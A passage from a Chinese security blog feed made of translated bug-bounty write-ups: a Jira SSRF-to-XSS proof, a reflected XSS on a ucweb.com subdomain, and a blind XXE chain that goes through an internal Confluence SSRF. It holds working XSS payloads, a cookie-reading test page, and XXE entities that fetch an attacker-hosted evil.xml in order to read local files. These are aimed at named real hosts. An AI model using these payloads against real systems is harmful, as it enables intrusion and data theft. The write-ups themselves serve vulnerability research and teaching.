<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;title&gt;SSRF to XSS on Jira Vulnerable Instances&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">  &lt;script&gt;</div><div class="line">   alert( document.domain + &quot; is vulnerable&quot; );</div><div class="line">            alert( document.cookie);</div><div class="line">&lt;/script&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_5/4.png" alt=""></p>
<h4 id="emsp-emsp-现在访问我们自己在VPS上搭建的XSS漏洞网页，验证能否触发XSS并获取Cookie"><a href="#emsp-emsp-现在访问我们自己在VPS上搭建的XSS漏洞网页，验证能否触发XSS并获取Cookie" class="headerlink" title="&emsp;&emsp;现在访问我们自己在VPS上搭建的XSS漏洞网页，验证能否触发XSS并获取Cookie"></a>&emsp;&emsp;现在访问我们自己在VPS上搭建的XSS漏洞网页，验证能否触发XSS并获取Cookie</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://customer-incident.consulting.visma.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http://VPSIP/evil.html</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_5/3.png" alt=""></p>
<h2 id="打赏译者"><a href="#打赏译者" class="headerlink" title="打赏译者"></a>打赏译者</h2><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_1/money.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;原文：How-Outdated-JIRA-Instances-suffers-from-multiple-security-vulnerabilities&quot;&gt;&lt;a href=&quot;#原文：How-Outdated-JIRA-Instances-suffers-from-multiple-security-vulnerabilities&quot; class=&quot;headerlink&quot; title=&quot;原文：How Outdated JIRA Instances suffers from multiple security vulnerabilities?&quot;&gt;&lt;/a&gt;原文：&lt;a href=&quot;https://medium.com/@Skylinearafat/how-outdated-jira-instances-suffers-from-multiple-security-vulnerabilities-6a88c45e9ec6&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;How Outdated JIRA Instances suffers from multiple security vulnerabilities?&lt;/a&gt;&lt;/h4&gt;&lt;h4 id=&quot;漏洞：SSRF-XSS&quot;&gt;&lt;a href=&quot;#漏洞：SSRF-XSS&quot; class=&quot;headerlink&quot; title=&quot;漏洞：SSRF + XSS&quot;&gt;&lt;/a&gt;漏洞：SSRF + XSS&lt;/h4&gt;&lt;h4 id=&quot;作者：Yeasir-Arafat&quot;&gt;&lt;a href=&quot;#作者：Yeasir-Arafat&quot; class=&quot;headerlink&quot; title=&quot;作者：Yeasir Arafat&quot;&gt;&lt;/a&gt;作者：Yeasir Arafat&lt;/h4&gt;&lt;h4 id=&quot;难度：低&quot;&gt;&lt;a href=&quot;#难度：低&quot; class=&quot;headerlink&quot; title=&quot;难度：低&quot;&gt;&lt;/a&gt;难度：低&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>第四篇翻译：XSS漏洞</title>
    <link href="http://TimeS0ng.github.io/2018/12/21/%E7%AC%AC%E5%9B%9B%E7%AF%87%E7%BF%BB%E8%AF%91%EF%BC%9AXSS%E6%BC%8F%E6%B4%9E/"/>
    <id>http://TimeS0ng.github.io/2018/12/21/第四篇翻译：XSS漏洞/</id>
    <published>2018-12-21T08:30:09.000Z</published>
    <updated>2019-01-25T01:10:13.271Z</updated>
    
    <content type="html"><![CDATA[<h4 id="原文：Dom-Based-XSS-in-ucweb-com"><a href="#原文：Dom-Based-XSS-in-ucweb-com" class="headerlink" title="原文：Dom Based XSS in ucweb.com"></a>原文：<a href="https://medium.com/@sudhanshur705/story-about-my-first-bug-bounty-9fe710be8241" target="_blank" rel="external">Dom Based XSS in ucweb.com</a></h4><h4 id="漏洞：XSS"><a href="#漏洞：XSS" class="headerlink" title="漏洞：XSS"></a>漏洞：XSS</h4><h4 id="作者：Sudhanshu-Rajbhar"><a href="#作者：Sudhanshu-Rajbhar" class="headerlink" title="作者：Sudhanshu Rajbhar"></a>作者：Sudhanshu Rajbhar</h4><h4 id="难度：低"><a href="#难度：低" class="headerlink" title="难度：低"></a>难度：低</h4><a id="more"></a>
<h2 id="现在开始…"><a href="#现在开始…" class="headerlink" title="现在开始…."></a>现在开始….</h2><h4 id="emsp-emsp-首先，我检查了可用的子域名，但是最开始我并没有发现什么有趣的东西。直到当我开始测试ucweb-com的子域名时，我发现了这个子域-samsung-ucweb-com-，samsung-三星？似乎有点意思，所以我尝试用浏览器去访问它"><a href="#emsp-emsp-首先，我检查了可用的子域名，但是最开始我并没有发现什么有趣的东西。直到当我开始测试ucweb-com的子域名时，我发现了这个子域-samsung-ucweb-com-，samsung-三星？似乎有点意思，所以我尝试用浏览器去访问它" class="headerlink" title="&emsp;&emsp;首先，我检查了可用的子域名，但是最开始我并没有发现什么有趣的东西。直到当我开始测试ucweb.com的子域名时，我发现了这个子域 samsung.ucweb.com ，samsung 三星？似乎有点意思，所以我尝试用浏览器去访问它"></a>&emsp;&emsp;首先，我检查了可用的子域名，但是最开始我并没有发现什么有趣的东西。直到当我开始测试ucweb.com的子域名时，我发现了这个子域 samsung.ucweb.com ，samsung 三星？似乎有点意思，所以我尝试用浏览器去访问它</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_4/1.png" alt=""></p>
<h4 id="emsp-emsp-很不幸，这是一个403-禁用的网站，如果是你碰见了下一步会怎么做？很显然，大多数人都会忽略它，然后测试其它子域。不过我曾读过一篇文章，它说如果你遇到这样的网站，尝试用Google-搜索一下相关站点信息，或许会有惊喜发现"><a href="#emsp-emsp-很不幸，这是一个403-禁用的网站，如果是你碰见了下一步会怎么做？很显然，大多数人都会忽略它，然后测试其它子域。不过我曾读过一篇文章，它说如果你遇到这样的网站，尝试用Google-搜索一下相关站点信息，或许会有惊喜发现" class="headerlink" title="&emsp;&emsp;很不幸，这是一个403 禁用的网站，如果是你碰见了下一步会怎么做？很显然，大多数人都会忽略它，然后测试其它子域。不过我曾读过一篇文章，它说如果你遇到这样的网站，尝试用Google 搜索一下相关站点信息，或许会有惊喜发现"></a>&emsp;&emsp;很不幸，这是一个403 禁用的网站，如果是你碰见了下一步会怎么做？很显然，大多数人都会忽略它，然后测试其它子域。不过我曾读过一篇文章，它说如果你遇到这样的网站，尝试用Google 搜索一下相关站点信息，或许会有惊喜发现</h4><h4 id="emsp-emsp-所以我是用谷歌语法简单的看了一下，site-samsung-ucweb-com-结果真的有惊喜"><a href="#emsp-emsp-所以我是用谷歌语法简单的看了一下，site-samsung-ucweb-com-结果真的有惊喜" class="headerlink" title="&emsp;&emsp;所以我是用谷歌语法简单的看了一下，site:samsung.ucweb.com  结果真的有惊喜"></a>&emsp;&emsp;所以我是用谷歌语法简单的看了一下，<strong>site:samsung.ucweb.com </strong> 结果真的有惊喜</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_4/2.png" alt=""></p>
<h4 id="emsp-emsp-我打开了这个URL：http-samsung-ucweb-com-webstore-classify-html-dataKey-LifeStyle-amp-title-LifeStyle-并开始测试相关参数，当我测试title参数时，发现服务端并没有过滤title参数的值就将其打印出来了"><a href="#emsp-emsp-我打开了这个URL：http-samsung-ucweb-com-webstore-classify-html-dataKey-LifeStyle-amp-title-LifeStyle-并开始测试相关参数，当我测试title参数时，发现服务端并没有过滤title参数的值就将其打印出来了" class="headerlink" title="&emsp;&emsp;我打开了这个URL：http://samsung.ucweb.com/webstore/classify.html?dataKey=LifeStyle&amp;title=LifeStyle 并开始测试相关参数，当我测试title参数时，发现服务端并没有过滤title参数的值就将其打印出来了"></a>&emsp;&emsp;我打开了这个URL：<a href="http://samsung.ucweb.com/webstore/classify.html?dataKey=LifeStyle&amp;title=LifeStyle" target="_blank" rel="external">http://samsung.ucweb.com/webstore/classify.html?dataKey=LifeStyle&amp;title=LifeStyle</a> 并开始测试相关参数，当我测试title参数时，发现服务端并没有过滤title参数的值就将其打印出来了</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_4/3.png" alt=""></p>
<h4 id="emsp-emsp-所以我尝试构造payload来利用这个漏洞点，当我使用”-gt-lt-script-gt-alert-1-lt-script-gt-时并没有任何弹窗，所以我尝试用-lt-img-gt-标签"><a href="#emsp-emsp-所以我尝试构造payload来利用这个漏洞点，当我使用”-gt-lt-script-gt-alert-1-lt-script-gt-时并没有任何弹窗，所以我尝试用-lt-img-gt-标签" class="headerlink" title="&emsp;&emsp;所以我尝试构造payload来利用这个漏洞点，当我使用”&gt; &lt; script&gt;alert(1)&lt;/ script&gt;时并没有任何弹窗，所以我尝试用 &lt; img&gt;标签"></a>&emsp;&emsp;所以我尝试构造payload来利用这个漏洞点，当我使用”&gt; &lt; script&gt;alert(1)&lt;/ script&gt;时并没有任何弹窗，所以我尝试用 &lt; img&gt;标签</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;&gt;&lt;img src=x onerror=alert(‘XSS’)&gt;</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_4/4.png" alt=""></p>
<h2 id="视屏演示"><a href="#视屏演示" class="headerlink" title="视屏演示"></a>视屏演示</h2><video id="video" controls preload="none" poster="http://img5.imgtn.bdimg.com/it/u=750248180,3726006403&fm=26&gp=0.jpg"><br><source id="mp4" src="http://img.027cgb.com/612577/times0ng_blog/tanslate_4/XSS_in_alibaba.mp4" type="video/mp4"><br></video>



<h2 id="打赏译者"><a href="#打赏译者" class="headerlink" title="打赏译者"></a>打赏译者</h2><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_1/money.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;原文：Dom-Based-XSS-in-ucweb-com&quot;&gt;&lt;a href=&quot;#原文：Dom-Based-XSS-in-ucweb-com&quot; class=&quot;headerlink&quot; title=&quot;原文：Dom Based XSS in ucweb.com&quot;&gt;&lt;/a&gt;原文：&lt;a href=&quot;https://medium.com/@sudhanshur705/story-about-my-first-bug-bounty-9fe710be8241&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Dom Based XSS in ucweb.com&lt;/a&gt;&lt;/h4&gt;&lt;h4 id=&quot;漏洞：XSS&quot;&gt;&lt;a href=&quot;#漏洞：XSS&quot; class=&quot;headerlink&quot; title=&quot;漏洞：XSS&quot;&gt;&lt;/a&gt;漏洞：XSS&lt;/h4&gt;&lt;h4 id=&quot;作者：Sudhanshu-Rajbhar&quot;&gt;&lt;a href=&quot;#作者：Sudhanshu-Rajbhar&quot; class=&quot;headerlink&quot; title=&quot;作者：Sudhanshu Rajbhar&quot;&gt;&lt;/a&gt;作者：Sudhanshu Rajbhar&lt;/h4&gt;&lt;h4 id=&quot;难度：低&quot;&gt;&lt;a href=&quot;#难度：低&quot; class=&quot;headerlink&quot; title=&quot;难度：低&quot;&gt;&lt;/a&gt;难度：低&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>第三篇翻译：XXE漏洞</title>
    <link href="http://TimeS0ng.github.io/2018/12/20/%E7%AC%AC%E4%B8%89%E7%AF%87%E7%BF%BB%E8%AF%91%EF%BC%9AXXE%E6%BC%8F%E6%B4%9E/"/>
    <id>http://TimeS0ng.github.io/2018/12/20/第三篇翻译：XXE漏洞/</id>
    <published>2018-12-20T12:54:30.000Z</published>
    <updated>2019-01-25T01:07:59.845Z</updated>
    
    <content type="html"><![CDATA[<h4 id="原文：From-blind-XXE-to-root-level-file-read-access"><a href="#原文：From-blind-XXE-to-root-level-file-read-access" class="headerlink" title="原文：From blind XXE to root-level file read access"></a>原文：<a href="https://www.honoki.net/2018/12/from-blind-xxe-to-root-level-file-read-access/" target="_blank" rel="external">From blind XXE to root-level file read access</a></h4><h4 id="漏洞：Blind-XXE"><a href="#漏洞：Blind-XXE" class="headerlink" title="漏洞：Blind XXE"></a>漏洞：Blind XXE</h4><h4 id="作者：Pieter"><a href="#作者：Pieter" class="headerlink" title="作者：Pieter"></a>作者：Pieter</h4><h4 id="难度：高"><a href="#难度：高" class="headerlink" title="难度：高"></a>难度：高</h4><a id="more"></a>
<h4 id="emsp-emsp-接下来，我将概述我挖洞时遇到的问题，以及遇到问题时我是怎么处理并解决的，希望这能够帮助大家在今后遇到类似的问题时知道该如何处理！"><a href="#emsp-emsp-接下来，我将概述我挖洞时遇到的问题，以及遇到问题时我是怎么处理并解决的，希望这能够帮助大家在今后遇到类似的问题时知道该如何处理！" class="headerlink" title="&emsp;&emsp;接下来，我将概述我挖洞时遇到的问题，以及遇到问题时我是怎么处理并解决的，希望这能够帮助大家在今后遇到类似的问题时知道该如何处理！"></a>&emsp;&emsp;接下来，我将概述我挖洞时遇到的问题，以及遇到问题时我是怎么处理并解决的，希望这能够帮助大家在今后遇到类似的问题时知道该如何处理！</h4><h2 id="我关注的重点？"><a href="#我关注的重点？" class="headerlink" title="我关注的重点？"></a>我关注的重点？</h2><h4 id="emsp-emsp-一个简单的XML格式的错误响应信息，以及一个被探测到的404地址引起了我的注意。"><a href="#emsp-emsp-一个简单的XML格式的错误响应信息，以及一个被探测到的404地址引起了我的注意。" class="headerlink" title="&emsp;&emsp;一个简单的XML格式的错误响应信息，以及一个被探测到的404地址引起了我的注意。"></a>&emsp;&emsp;一个简单的XML格式的错误响应信息，以及一个被探测到的404地址引起了我的注意。</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/1.png" alt=""></p>
<h4 id="emsp-emsp-当我将请求方法改为POST，并且增加一个请求头-Content-Type-application-xml，再添加了一个XML主体之后，响应消息让我大吃一惊！"><a href="#emsp-emsp-当我将请求方法改为POST，并且增加一个请求头-Content-Type-application-xml，再添加了一个XML主体之后，响应消息让我大吃一惊！" class="headerlink" title="&emsp;&emsp;当我将请求方法改为POST，并且增加一个请求头 Content-Type: application/xml，再添加了一个XML主体之后，响应消息让我大吃一惊！"></a>&emsp;&emsp;当我将请求方法改为POST，并且增加一个请求头 Content-Type: application/xml，再添加了一个XML主体之后，响应消息让我大吃一惊！</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/2.png" alt=""></p>
<h4 id="emsp-emsp-继续完善XML主体，当发送完整的XML文档时会产生下面的结果。我们注意到服务器需要认证之后才能进行交互，但是我们完全不知道该认证什么以及在哪里进行认证，所以这里XXE漏洞很难利用"><a href="#emsp-emsp-继续完善XML主体，当发送完整的XML文档时会产生下面的结果。我们注意到服务器需要认证之后才能进行交互，但是我们完全不知道该认证什么以及在哪里进行认证，所以这里XXE漏洞很难利用" class="headerlink" title="&emsp;&emsp;继续完善XML主体，当发送完整的XML文档时会产生下面的结果。我们注意到服务器需要认证之后才能进行交互，但是我们完全不知道该认证什么以及在哪里进行认证，所以这里XXE漏洞很难利用"></a>&emsp;&emsp;继续完善XML主体，当发送完整的XML文档时会产生下面的结果。我们注意到服务器需要认证之后才能进行交互，但是我们完全不知道该认证什么以及在哪里进行认证，所以这里XXE漏洞很难利用</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/3.png" alt=""></p>
<h4 id="emsp-emsp-尽管现在发现的漏洞如此鸡肋，但是无论怎样我们都应该尝试一下包含DOCTYPE-定义的外部实体是否可用，如果外部实体没有被完全禁用，那么就还有戏"><a href="#emsp-emsp-尽管现在发现的漏洞如此鸡肋，但是无论怎样我们都应该尝试一下包含DOCTYPE-定义的外部实体是否可用，如果外部实体没有被完全禁用，那么就还有戏" class="headerlink" title="&emsp;&emsp;尽管现在发现的漏洞如此鸡肋，但是无论怎样我们都应该尝试一下包含DOCTYPE 定义的外部实体是否可用，如果外部实体没有被完全禁用，那么就还有戏"></a>&emsp;&emsp;尽管现在发现的漏洞如此鸡肋，但是无论怎样我们都应该尝试一下包含DOCTYPE 定义的外部实体是否可用，如果外部实体没有被完全禁用，那么就还有戏</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/4.png" alt=""></p>
<h4 id="emsp-emsp-我紧张的看着我的Burp-Collaborator-的结果，非常期待收到来自服务器传递过来的HTTP请求，但是很不幸，并没有得到预期的结果。可以看见服务器解析了我的域名，但是却没有HTTP请求，并且服务器在几秒钟之后就因500错误Timeout了。这似乎是因为防火墙阻止了服务器的出口流量，只有UDP-53端口开放"><a href="#emsp-emsp-我紧张的看着我的Burp-Collaborator-的结果，非常期待收到来自服务器传递过来的HTTP请求，但是很不幸，并没有得到预期的结果。可以看见服务器解析了我的域名，但是却没有HTTP请求，并且服务器在几秒钟之后就因500错误Timeout了。这似乎是因为防火墙阻止了服务器的出口流量，只有UDP-53端口开放" class="headerlink" title="&emsp;&emsp;我紧张的看着我的Burp Collaborator 的结果，非常期待收到来自服务器传递过来的HTTP请求，但是很不幸，并没有得到预期的结果。可以看见服务器解析了我的域名，但是却没有HTTP请求，并且服务器在几秒钟之后就因500错误Timeout了。这似乎是因为防火墙阻止了服务器的出口流量，只有UDP 53端口开放"></a>&emsp;&emsp;我紧张的看着我的Burp Collaborator 的结果，非常期待收到来自服务器传递过来的HTTP请求，但是很不幸，并没有得到预期的结果。可以看见服务器解析了我的域名，但是却没有HTTP请求，并且服务器在几秒钟之后就因500错误Timeout了。这似乎是因为防火墙阻止了服务器的出口流量，只有UDP 53端口开放</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/5.png" alt=""></p>
<h2 id="盲注…"><a href="#盲注…" class="headerlink" title="盲注…"></a>盲注…</h2><h4 id="emsp-emsp-当我尝试访问本地文件和内部网络服务的时候，我得到了一些反馈结果，不过这并没有太大的价值！下面的Response-error表示访问的文件存在，并且可以由XML解析器打开和读取，但是该文件的内容不是有效的DTD文档类型，所以解析失败并且报错"><a href="#emsp-emsp-当我尝试访问本地文件和内部网络服务的时候，我得到了一些反馈结果，不过这并没有太大的价值！下面的Response-error表示访问的文件存在，并且可以由XML解析器打开和读取，但是该文件的内容不是有效的DTD文档类型，所以解析失败并且报错" class="headerlink" title="&emsp;&emsp;当我尝试访问本地文件和内部网络服务的时候，我得到了一些反馈结果，不过这并没有太大的价值！下面的Response error表示访问的文件存在，并且可以由XML解析器打开和读取，但是该文件的内容不是有效的DTD文档类型，所以解析失败并且报错"></a>&emsp;&emsp;当我尝试访问本地文件和内部网络服务的时候，我得到了一些反馈结果，不过这并没有太大的价值！下面的Response error表示访问的文件存在，并且可以由XML解析器打开和读取，但是该文件的内容不是有效的DTD文档类型，所以解析失败并且报错</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/6.png" alt=""></p>
<h4 id="emsp-emsp-当访问不存在的文件时，Response-error-响应信息不同，它会提示文件不存在"><a href="#emsp-emsp-当访问不存在的文件时，Response-error-响应信息不同，它会提示文件不存在" class="headerlink" title="&emsp;&emsp;当访问不存在的文件时，Response error 响应信息不同，它会提示文件不存在"></a>&emsp;&emsp;当访问不存在的文件时，Response error 响应信息不同，它会提示文件不存在</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/7.png" alt=""></p>
<h4 id="emsp-emsp-接下来我们尝试利用这个blind-XXE-漏洞做为一个原始的端口扫描器，扫描内网端口。这种类型的bind-XXE-类似于SSRF漏洞：你可以生成HTTP请求，但是不能读取响应信息"><a href="#emsp-emsp-接下来我们尝试利用这个blind-XXE-漏洞做为一个原始的端口扫描器，扫描内网端口。这种类型的bind-XXE-类似于SSRF漏洞：你可以生成HTTP请求，但是不能读取响应信息" class="headerlink" title="&emsp;&emsp;接下来我们尝试利用这个blind XXE 漏洞做为一个原始的端口扫描器，扫描内网端口。这种类型的bind XXE 类似于SSRF漏洞：你可以生成HTTP请求，但是不能读取响应信息"></a>&emsp;&emsp;接下来我们尝试利用这个blind XXE 漏洞做为一个原始的端口扫描器，扫描内网端口。这种类型的bind XXE 类似于SSRF漏洞：你可以生成HTTP请求，但是不能读取响应信息</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/8.png" alt=""></p>
<h4 id="emsp-emsp-既然可以扫描端口，我们同样也能检查服务器支持的协议类型，例如：https，gopher，ftp，jar，scp等等。看下图，错误消息中会将用户提供的协议打印出来，这个有点意思，我们暂时记住它以后再说！"><a href="#emsp-emsp-既然可以扫描端口，我们同样也能检查服务器支持的协议类型，例如：https，gopher，ftp，jar，scp等等。看下图，错误消息中会将用户提供的协议打印出来，这个有点意思，我们暂时记住它以后再说！" class="headerlink" title="&emsp;&emsp;既然可以扫描端口，我们同样也能检查服务器支持的协议类型，例如：https，gopher，ftp，jar，scp等等。看下图，错误消息中会将用户提供的协议打印出来，这个有点意思，我们暂时记住它以后再说！"></a>&emsp;&emsp;既然可以扫描端口，我们同样也能检查服务器支持的协议类型，例如：https，gopher，ftp，jar，scp等等。看下图，错误消息中会将用户提供的协议打印出来，这个有点意思，我们暂时记住它以后再说！</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/9.png" alt=""></p>
<h4 id="emsp-emsp-现在我们尝试利用Bind-XXE访问内部WEB网站，前面测试中我们发现出口流量会被防火墙阻拦，但是内部访问是否同样会被禁止呢？有趣，Response-error中的错误信息我们之前也遇到过，那代表着资源已经被读取，但不是XML格式所以出错，这意味着内部网络是可以访问的，防火墙并没有拦截！"><a href="#emsp-emsp-现在我们尝试利用Bind-XXE访问内部WEB网站，前面测试中我们发现出口流量会被防火墙阻拦，但是内部访问是否同样会被禁止呢？有趣，Response-error中的错误信息我们之前也遇到过，那代表着资源已经被读取，但不是XML格式所以出错，这意味着内部网络是可以访问的，防火墙并没有拦截！" class="headerlink" title="&emsp;&emsp;现在我们尝试利用Bind XXE访问内部WEB网站，前面测试中我们发现出口流量会被防火墙阻拦，但是内部访问是否同样会被禁止呢？有趣，Response error中的错误信息我们之前也遇到过，那代表着资源已经被读取，但不是XML格式所以出错，这意味着内部网络是可以访问的，防火墙并没有拦截！"></a>&emsp;&emsp;现在我们尝试利用Bind XXE访问内部WEB网站，前面测试中我们发现出口流量会被防火墙阻拦，但是内部访问是否同样会被禁止呢？有趣，Response error中的错误信息我们之前也遇到过，那代表着资源已经被读取，但不是XML格式所以出错，这意味着内部网络是可以访问的，防火墙并没有拦截！</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">wiki.company.internal</div><div class="line">jira.company.internal</div><div class="line">confluence.company.internal</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/10.png" alt=""></p>
<h2 id="柳暗花明？！"><a href="#柳暗花明？！" class="headerlink" title="柳暗花明？！"></a>柳暗花明？！</h2><h4 id="emsp-emsp-当我们访问jira-company-internal-这个站点成功之后，我觉得我现在可以祭出大杀器了–—利用jira的URL重定向漏洞，将它设置为我们的代理主机，并尝试利用代理主机将流量转发出来，如果你不知道这个漏洞，我建议你看看freebuf上的这篇文章-https-www-freebuf-com-vuls-168719-html"><a href="#emsp-emsp-当我们访问jira-company-internal-这个站点成功之后，我觉得我现在可以祭出大杀器了–—利用jira的URL重定向漏洞，将它设置为我们的代理主机，并尝试利用代理主机将流量转发出来，如果你不知道这个漏洞，我建议你看看freebuf上的这篇文章-https-www-freebuf-com-vuls-168719-html" class="headerlink" title="&emsp;&emsp;当我们访问jira.company.internal 这个站点成功之后，我觉得我现在可以祭出大杀器了–—利用jira的URL重定向漏洞，将它设置为我们的代理主机，并尝试利用代理主机将流量转发出来，如果你不知道这个漏洞，我建议你看看freebuf上的这篇文章 https://www.freebuf.com/vuls/168719.html"></a>&emsp;&emsp;当我们访问jira.company.internal 这个站点成功之后，我觉得我现在可以祭出大杀器了–—利用jira的URL重定向漏洞，将它设置为我们的代理主机，并尝试利用代理主机将流量转发出来，如果你不知道这个漏洞，我建议你看看freebuf上的这篇文章 <a href="https://www.freebuf.com/vuls/168719.html" target="_blank" rel="external">https://www.freebuf.com/vuls/168719.html</a></h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/11.png" alt=""></p>
<h4 id="emsp-emsp-代理失败了，原因是在SSL认证中出现任何错误的话，HTTPS流量都将失效！幸运的是，Jira默认也运行在TCP-8080端口上，所以咱们用HTTP协议再来代理看看。当我检查Burp-Collaborator时，并没有任何HTTP访问请求，继续宣告代理失败…"><a href="#emsp-emsp-代理失败了，原因是在SSL认证中出现任何错误的话，HTTPS流量都将失效！幸运的是，Jira默认也运行在TCP-8080端口上，所以咱们用HTTP协议再来代理看看。当我检查Burp-Collaborator时，并没有任何HTTP访问请求，继续宣告代理失败…" class="headerlink" title="&emsp;&emsp;代理失败了，原因是在SSL认证中出现任何错误的话，HTTPS流量都将失效！幸运的是，Jira默认也运行在TCP 8080端口上，所以咱们用HTTP协议再来代理看看。当我检查Burp Collaborator时，并没有任何HTTP访问请求，继续宣告代理失败…."></a>&emsp;&emsp;代理失败了，原因是在SSL认证中出现任何错误的话，HTTPS流量都将失效！幸运的是，Jira默认也运行在TCP 8080端口上，所以咱们用HTTP协议再来代理看看。当我检查Burp Collaborator时，并没有任何HTTP访问请求，继续宣告代理失败….</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/12.png" alt=""></p>
<h4 id="emsp-emsp-出现上面的情况很有可能是管理员已经修复了Jira中的漏洞。最后我已经接近疯狂了，TMD利用个漏洞这么麻烦，我尝试了可能存在的SSRF漏洞，当我在内部网站http-Confluence-company-internal-上尝试用与Jira相同的漏洞时奇迹发生了，代理生效了，终于有HTTP请求啦"><a href="#emsp-emsp-出现上面的情况很有可能是管理员已经修复了Jira中的漏洞。最后我已经接近疯狂了，TMD利用个漏洞这么麻烦，我尝试了可能存在的SSRF漏洞，当我在内部网站http-Confluence-company-internal-上尝试用与Jira相同的漏洞时奇迹发生了，代理生效了，终于有HTTP请求啦" class="headerlink" title="&emsp;&emsp;出现上面的情况很有可能是管理员已经修复了Jira中的漏洞。最后我已经接近疯狂了，TMD利用个漏洞这么麻烦，我尝试了可能存在的SSRF漏洞，当我在内部网站http://Confluence.company.internal 上尝试用与Jira相同的漏洞时奇迹发生了，代理生效了，终于有HTTP请求啦"></a>&emsp;&emsp;出现上面的情况很有可能是管理员已经修复了Jira中的漏洞。最后我已经接近疯狂了，TMD利用个漏洞这么麻烦，我尝试了可能存在的SSRF漏洞，当我在内部网站<a href="http://Confluence.company.internal" target="_blank" rel="external">http://Confluence.company.internal</a> 上尝试用与Jira相同的漏洞时奇迹发生了，代理生效了，终于有HTTP请求啦</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/13.png" alt=""></p>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/14.png" alt=""></p>
<h4 id="emsp-emsp-Bingo！我们成功利用内部WEB站点作代理绕过防火墙，将流量转发到攻击者的电脑上。这意味着从现在开始我们就能利用经典的blind-XXE进行攻击啦-此处应该有掌声👏-，如果不清楚bind-XXE的利用方法的话可以参考freebuf上的文章-https-www-freebuf-com-column-181064-html"><a href="#emsp-emsp-Bingo！我们成功利用内部WEB站点作代理绕过防火墙，将流量转发到攻击者的电脑上。这意味着从现在开始我们就能利用经典的blind-XXE进行攻击啦-此处应该有掌声👏-，如果不清楚bind-XXE的利用方法的话可以参考freebuf上的文章-https-www-freebuf-com-column-181064-html" class="headerlink" title="&emsp;&emsp;Bingo！我们成功利用内部WEB站点作代理绕过防火墙，将流量转发到攻击者的电脑上。这意味着从现在开始我们就能利用经典的blind XXE进行攻击啦(此处应该有掌声👏)，如果不清楚bind XXE的利用方法的话可以参考freebuf上的文章 https://www.freebuf.com/column/181064.html"></a>&emsp;&emsp;Bingo！我们成功利用内部WEB站点作代理绕过防火墙，将流量转发到攻击者的电脑上。这意味着从现在开始我们就能利用经典的blind XXE进行攻击啦(此处应该有掌声👏)，如果不清楚bind XXE的利用方法的话可以参考freebuf上的文章 <a href="https://www.freebuf.com/column/181064.html" target="_blank" rel="external">https://www.freebuf.com/column/181064.html</a></h4><p>[*]攻击者服务器上的evil.xml</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % file SYSTEM &quot;file:///&quot;&gt;</div><div class="line">&lt;!ENTITY % ent &quot;&lt;!ENTITY data SYSTEM &apos;%file;&apos;&gt;&quot;&gt;</div></pre></td></tr></table></figure>
<p>[*]burp发送的xml注入语句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</div><div class="line">&lt;!DOCTYPE root [</div><div class="line">&lt;!ENTITY % ext SYSTEM &quot;http://confluence.company.internal:8090/plugins/servlet/oauth/users/icon-uri?consumerUri=http://my_evil_site/evil.xml&quot;&gt;</div><div class="line">%ext;</div><div class="line">%ent;</div><div class="line">]&gt;</div><div class="line">&lt;r&gt;&amp;data;&lt;/r&gt;</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/15.png" alt=""></p>
